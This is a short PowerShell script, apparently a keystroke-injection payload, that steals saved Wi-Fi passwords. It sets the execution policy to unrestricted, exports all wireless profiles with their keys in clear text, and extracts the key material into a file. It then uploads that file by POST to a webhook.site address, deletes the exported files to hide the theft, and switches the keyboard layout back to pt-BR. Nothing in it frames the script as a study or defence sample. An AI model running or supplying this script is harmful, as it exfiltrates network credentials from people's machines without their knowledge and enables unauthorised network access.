set-ExecutionPolicy unrestricted -Force


Set-WinUserLanguageList en-US -Force


net start wlansvc


$env:TEMP


netsh wlan export profile key=clear


powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS


Invoke-WebRequest -Uri "https://webhook.site/35192f97-171d-428f-b03e-33726a40cde1" -Method POST -InFile Wi-Fi-PASS


Remove-Item Wi-* -Force -Recurse


Set-WinUserLanguageList pt-BR -Force


exit
